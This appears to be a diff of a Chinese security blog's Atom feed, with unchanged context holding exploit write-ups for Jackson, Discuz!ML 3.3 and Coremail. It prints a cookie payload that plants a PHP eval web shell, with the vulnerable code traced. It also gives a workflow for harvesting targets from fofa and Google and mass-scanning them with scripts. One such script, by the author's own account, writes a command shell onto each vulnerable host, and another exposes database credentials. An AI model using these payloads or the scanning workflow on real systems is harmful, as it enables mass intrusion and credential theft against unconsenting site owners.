@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>http://www.svenbeast.com/</id>
     <title>斯文beast&apos;blog</title>
-    <updated>2019-09-14T11:59:20.826Z</updated>
+    <updated>2019-09-23T03:14:19.838Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="http://www.svenbeast.com/"/>
     <link rel="self" href="http://www.svenbeast.com//atom.xml"/>
@@ -712,11 +712,11 @@ https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=69
 <p>ps:ln -s ~/jruby-9.2.7.0/bin/jruby /usr/local/bin/<br>
 <img src="http://www.svenbeast.com//post-images/1564482020021.png" alt=""></p>
 <h4 id="3运行testrb进行命令执行">3.运行test.rb,进行命令执行</h4>
-<p><img src="http://www.svenbeast.com//post-images/1564482687320.png" alt=""></p>
+<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1564482687320.png" alt=""></figure>
 <h4 id="4这里的injectsql为写命令的文件此文件放在http服务的根目录里jackson要能远程获取到">4.这里的inject.sql，为写命令的文件，此文件放在http服务的根目录里，jackson要能远程获取到</h4>
-<p><img src="http://www.svenbeast.com//post-images/1564483081513.png" alt=""></p>
+<figure data-type="image" tabindex="2"><img src="http://www.svenbeast.com//post-images/1564483081513.png" alt=""></figure>
 <h4 id="5在完成第三步的时候已经命令执行完成在http服务的根目录会生成exploitedtxt文件里面是命令执行后得到的回显">5.在完成第三步的时候，已经命令执行完成，在http服务的根目录会生成exploited.txt文件，里面是命令执行后得到的回显</h4>
-<p><img src="http://www.svenbeast.com//post-images/1564483152187.png" alt=""></p>
+<figure data-type="image" tabindex="3"><img src="http://www.svenbeast.com//post-images/1564483152187.png" alt=""></figure>
 <p>PS：解压密码:svenbeast<br>
 链接: https://pan.baidu.com/s/1yhdmOz3QQ7Nm_Ar6m4-dWg<br>
 提取码: avpe</p>
@@ -737,7 +737,7 @@ https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=69
 <p>下载源码后，解压至安装目录后访问:127.0.0.1/discuz!ml3.3/upload,进入此目标将开始安装</p>
 <p>因为本人已经安装好，就不在滚键盘了，直接下一步即可，最后写上本机的数据库连接密码，在设置管理员账号密码即可</p>
 <p>ps:安装后无图片显示，莫慌，不影响使用</p>
-<p><img src="http://www.svenbeast.com//post-images/1563443055749.png" alt=""></p>
+<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1563443055749.png" alt=""></figure>
 <h3 id="s3-代码执行">s3. 代码执行</h3>
 <ul>
 <li>
@@ -748,11 +748,11 @@ https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=69
 </li>
 </ul>
 <p>抓包找到cookie的language的值修改为xxxx_xxxx_language=sc'.phpinfo().'，成功执行，这里的sc可以不带</p>
-<p><img src="http://www.svenbeast.com//post-images/1563443067475.png" alt=""></p>
+<figure data-type="image" tabindex="2"><img src="http://www.svenbeast.com//post-images/1563443067475.png" alt=""></figure>
 <ul>
 <li>构造一句话,连接蚁剑</li>
 </ul>
-<p><img src="http://www.svenbeast.com//post-images/1563443076681.png" alt=""></p>
+<figure data-type="image" tabindex="3"><img src="http://www.svenbeast.com//post-images/1563443076681.png" alt=""></figure>
 <p>payload：%27.%2Bfile_put_contents%28%27shell.php%27%2Curldecode%28%27%253C%253Fphp%2520eval%2528%2524_POST%255B%25221%2522%255D%2529%253B%253F%253E%27%29%29.%27</p>
 <p>实际为：'.+file_put_contents('shell.php',urldecode('<?php eval($_POST["1"]);?>')).'</p>
 <p>可看到路径下生成shell.php，连接密码为1<br>
@@ -763,15 +763,15 @@ https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=69
 <p>借用此作者的脚本，写的非常全，方便检测和验证</p>
 <h3 id="s4-分析">s4. 分析</h3>
 <p>在discuz!ml3.3\upload\source\module\portal的portal_index.php里存在着包含</p>
-<p><img src="http://www.svenbeast.com//post-images/1563443104649.png" alt=""></p>
+<figure data-type="image" tabindex="4"><img src="http://www.svenbeast.com//post-images/1563443104649.png" alt=""></figure>
 <p>跟踪template</p>
 <p>在discuz!ml3.3\upload\source\function的function_core.php文件中</p>
-<p><img src="http://www.svenbeast.com//post-images/1563443114587.png" alt=""></p>
+<figure data-type="image" tabindex="5"><img src="http://www.svenbeast.com//post-images/1563443114587.png" alt=""></figure>
 <p>他的返回值为DISCUZ_ROOT.<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>a</mi><mi>c</mi><mi>h</mi><mi>e</mi><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">而</mi></mrow><annotation encoding="application/x-tex">cachefile，而</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">a</span><span class="mord mathdefault">c</span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">而</span></span></span></span>cachefile在上面也有，可看出由各变量来进行组成的，其中的DISCUZ_LANG为可控制变量</p>
 <p>discuz!ml3.3\upload\source\class\discuz下的discuz_application.php文件</p>
 <p><img src="http://www.svenbeast.com//post-images/1563443125491.png" alt=""><br>
 ↑ 可看出这里直接将值传入到lng变量，继续跟踪</p>
-<p><img src="http://www.svenbeast.com//post-images/1563443135323.png" alt=""></p>
+<figure data-type="image" tabindex="6"><img src="http://www.svenbeast.com//post-images/1563443135323.png" alt=""></figure>
 <p>↑ $lng直接赋给DISCUZ_LANG，所以DISCUZ_LANG常量为可控</p>
 <p>因此payload通过修改cookie里的language字段内容传入，目前已经控制了文件名字，而Discuz会将我们写入的存入缓存，真正包含的是缓存文件</p>
 <p>写入的缓存文件存在discuz!ml3.3\upload\data\template</p>
@@ -783,7 +783,7 @@ https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=69
 <p><img src="http://www.svenbeast.com//post-images/1563443191459.png" alt=""><br>
 ↑ 最后将$template写入到缓存文件，也就是上面说的那个目录下</p>
 <p>终于被include包含执行</p>
-<p><img src="http://www.svenbeast.com//post-images/1563443317792.png" alt=""></p>
+<figure data-type="image" tabindex="7"><img src="http://www.svenbeast.com//post-images/1563443317792.png" alt=""></figure>
 <ul>
 <li>总结：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>l</mi><mi>a</mi><mi>n</mi><mi>g</mi><mi>u</mi><mi>a</mi><mi>g</mi><mi>e</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">控</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">传</mi><mi mathvariant="normal">给</mi></mrow><annotation encoding="application/x-tex">language可控，传给</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">u</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">控</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">传</span><span class="mord cjk_fallback">给</span></span></span></span>template，生成缓存文件后，又被include_once包含，造成RCE</li>
 </ul>
@@ -804,7 +804,7 @@ https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=69
         <updated>2019-06-27T00:01:02.000Z</updated>
         <content type="html"><![CDATA[<h3 id="步骤1利用fofa搜索目标然后保存成1html网页到fofapy同一路径下">步骤1：利用fofa搜索目标，然后保存成1.html网页到fofa.py同一路径下</h3>
 <p>usage：ctrl+s</p>
-<p><img src="http://www.svenbeast.com//post-images/1563442685193.png" alt=""></p>
+<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1563442685193.png" alt=""></figure>
 <h3 id="步骤2用fofapy-导出域名和ip因为fofa的导出和api都要rmb脚本写的不好见谅了但胜在比手动快一些-">步骤2：用fofa.py 导出域名和ip，因为fofa的导出和api都要RMB，脚本写的不好，见谅了，但胜在比手动快一些 -.- !</h3>
 <p>usage：python2 fofa.py</p>
 <pre><code>#coding=utf-8
@@ -836,7 +836,7 @@ with open('1.html','r') as f:
                         s.write(ip)
                         s.write('\n')
 </code></pre>
-<p><img src="http://www.svenbeast.com//post-images/1563442574393.png" alt=""></p>
+<figure data-type="image" tabindex="2"><img src="http://www.svenbeast.com//post-images/1563442574393.png" alt=""></figure>
 <h3 id="步骤3用pocpy检测一下生成successtxt这里注意的是会直接写入cmd马敏感目标请自己注意">步骤3：用poc.py检测一下，生成success.txt，这里注意的是，会直接写入cmd马，敏感目标请自己注意。</h3>
 <p>ps：这个脚本弄了很长时间，没办法，菜~，requests.post这里总是报错，抓狂，也没人可以问 -.- !</p>
 <p>usage：python3 poc.py</p>
@@ -884,9 +884,9 @@ for x in range(th_num):
 for x in range(th_num):
         th[x].join()
 </code></pre>
-<p><img src="http://www.svenbeast.com//post-images/1563442604575.png" alt=""></p>
+<figure data-type="image" tabindex="3"><img src="http://www.svenbeast.com//post-images/1563442604575.png" alt=""></figure>
 <h3 id="步骤4打开successtxt复制链接去执行命令吧提交src当然我肯定抢不过各位大佬的">步骤4：打开success.txt复制链接去执行命令吧，提交SRC，当然我肯定抢不过各位大佬的。</h3>
-<p><img src="http://www.svenbeast.com//post-images/1563442600570.png" alt=""></p>
+<figure data-type="image" tabindex="4"><img src="http://www.svenbeast.com//post-images/1563442600570.png" alt=""></figure>
 <p>代码已经提供了，可以自己复制，同时也分享了百度云和附件</p>
 <p>链接: https://pan.baidu.com/s/1xfcxfk16PanOtjUBJmKdxQ 提取码: xrrq<br>
 解压密码：svenbeast</p>
@@ -907,7 +907,7 @@ for x in range(th_num):
 <h3 id="首先步骤1利用google语法列出搜索结果并保存网页">首先步骤1：利用google语法列出搜索结果并保存网页#</h3>
 <p>这里图片里的google语法是 inurl:coremail（其他语法需自行构造，最好加上中文关键字），然后翻到第2页，ctrl+s将页面保存为1.html<br>
 ps：拥有ZoomEye，Fofa，shodan账号的略过即可 -.-</p>
-<p><img src="http://www.svenbeast.com//post-images/1563502445782.png" alt=""></p>
+<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1563502445782.png" alt=""></figure>
 <h3 id="步骤2获取html文件中的coremaile域名">步骤2：获取html文件中的coremaile域名#</h3>
 <p>usage：python2 damain.py</p>
 <pre><code>#coding=utf-8
@@ -929,7 +929,7 @@ with open('1.html','r') as f:
             s.write('http://'+url)
             s.write('\n')
 </code></pre>
-<p><img src="http://www.svenbeast.com//post-images/1563502540703.png" alt=""></p>
+<figure data-type="image" tabindex="2"><img src="http://www.svenbeast.com//post-images/1563502540703.png" alt=""></figure>
 <p>会在当前目录下生成ip.txt</p>
 <p>Ps：记得把生成的ip.txt文件中google.com后缀的网站删掉，这个是google翻译，不删掉有些浪费检测时间，毕竟是单线程，hh。<br>
 步骤3：批量验证漏洞#<br>
@@ -962,7 +962,7 @@ for f in file.readlines():
     url = f.strip('\r\n')
     mailsmsPoC(url)
 </code></pre>
-<p><img src="http://www.svenbeast.com//post-images/1563502552598.png" alt=""></p>
+<figure data-type="image" tabindex="3"><img src="http://www.svenbeast.com//post-images/1563502552598.png" alt=""></figure>
 <p>步骤4：存在漏洞的会在当前目录下生成vul.txt，直接复制url粘贴到网页上，ctr+f搜索database就可以看到数据库的账号密码一些信息了,就可以开始截图进行src提交了#<br>
 <img src="http://www.svenbeast.com//post-images/1563502558364.png" alt=""></p>
 <p>结束：获取域名时，后得到的域名是编辑进ip.txt文件的，所以不必担心多次获取域名后替换前面已获取的。</p>
